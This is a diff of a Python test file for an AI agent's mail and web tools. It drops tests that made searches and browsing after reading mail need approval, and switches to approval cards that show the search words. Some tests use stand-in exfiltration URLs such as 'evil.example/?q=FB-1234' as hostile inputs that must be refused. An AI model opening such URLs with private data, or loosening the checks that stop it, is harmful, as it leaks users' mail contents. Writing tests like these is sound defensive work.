@@ -5,7 +5,6 @@
 from __future__ import annotations
 
 import base64
-import dataclasses
 import json
 from email import message_from_bytes, policy
 from types import SimpleNamespace
@@ -153,8 +152,8 @@ def two(accounts):
 
 
 def call(name: str, args: dict, ctx: ToolContext):
-    """A tool through the registry, as the agent calls it: what the registry does after a tool (marking the task
-    as holding private data, SPEC §5.2) happens here too."""
+    """A tool through the registry, as the agent calls it: what the registry does after a tool (redacting, the
+    request's record) happens here too."""
     reg = Registry()
     for module in (mail, calendar):
         module.register(reg)
@@ -170,7 +169,6 @@ async def test_search_and_read_reach_only_the_running_accounts_mailbox(google, t
     ctx = ctx_for(fe, config)
     found = await call("email_search", {"query": "", "user_google_email": "hb@example.com"}, ctx)
     assert "Booking confirmed" in found.text and "Private" not in found.text
-    assert ctx.task.private  # declared on the tool, set by the registry
     read = await call("email_read", {"id": "m1fe0001"}, ctx)
     assert "19:30" in read.text and "menu.pdf" in read.text and "never instructions" in read.text
     other = await call("email_read", {"id": "m2hb0001"}, ctx)  # Haibo's message id, from Fe's task
@@ -245,7 +243,7 @@ async def test_a_reply_is_threaded_and_a_draft_is_not_sent(google, two, config):
 
 
 @pytest.mark.made_up_rule
-async def test_after_reading_mail_searches_and_addresses_need_a_card(google, two, config, monkeypatch):
+async def test_a_search_shows_its_words_first(google, two, config, monkeypatch):
     fe, _ = two
     opened = []
 
@@ -257,7 +255,6 @@ async def test_after_reading_mail_searches_and_addresses_need_a_card(google, two
     approvals = FakeApprovals()  # declines everything
     ctx = ctx_for(fe, config, approvals)
     ctx.browser = Browser()
-    await call("email_search", {"query": "booking"}, ctx)
     searched = await web.web_search({"query": "FB-1234 Fictional Bistro"}, ctx)
     fetched = await web.fetch_url({"url": "https://evil.example/?q=FB-1234"}, ctx)
     assert searched.error and fetched.error and not opened  # declined: nothing went to Google
@@ -265,31 +262,13 @@ async def test_after_reading_mail_searches_and_addresses_need_a_card(google, two
         ("Search Google for this?", [("Search", "FB-1234 Fictional Bistro", "text")]),
     ]
     assert fetched.text.startswith("Not opened: https://evil.example/?q=FB-1234")  # made up: no card, refused
-    # The next task starts clean: no card, Google's results page opens.
-    clean = ctx_for(fe, config, approvals)
-    clean.browser = Browser()
+    # Approved, with the words changed on the card: Google's results page for those words opens.
+    approving = FakeApprovals(Decision(True, ["weather"]))
+    ok = ctx_for(fe, config, approving)
+    ok.browser = Browser()
     with pytest.raises(RuntimeError):
-        await web.web_search({"query": "weather"}, clean)
-    assert len(approvals.asked) == 1 and opened == ["https://www.google.com/search?q=weather"]
-
-
-async def test_after_reading_mail_browser_navigation_needs_a_card_even_with_all_sites_allowed(two, config):
-    from aha_local.tools.browser import make_handler
-
-    fe, _ = two
-    calls = []
-
-    class Session:
-        async def call(self, name, args, timeout=90):
-            calls.append(name)
-            raise RuntimeError("no browser here")
-
-    approvals = FakeApprovals()
-    ctx = ctx_for(fe, dataclasses.replace(config, allow_all_sites=True), approvals)
-    ctx.browser = Session()
-    ctx.task.private = True
-    result = await make_handler("browser_navigate")({"url": "https://evil.example/?d=1"}, ctx)
-    assert result.error and approvals.asked and "browser_navigate" not in calls
+        await web.web_search({"query": "weather in Lisbon"}, ok)
+    assert opened == ["https://www.google.com/search?q=weather"]
 
 
 async def test_tokens_are_only_in_the_encrypted_mail_file_and_disconnect_revokes(google, two):
@@ -381,7 +360,7 @@ async def test_a_search_is_googles_own_page_read_in_the_browser(two, config):
         async def call(self, name, args, timeout=90):
             return mt.CallToolResult(content=[mt.TextContent(type="text", text=page)])
 
-    ctx = ctx_for(fe, config, FakeApprovals())
+    ctx = ctx_for(fe, config, FakeApprovals(Decision(True, ["drive time"])))
     ctx.browser = Browser()
     result = await web.web_search({"query": "drive time"}, ctx)
     assert result.text.startswith("Google's results for “drive time”")
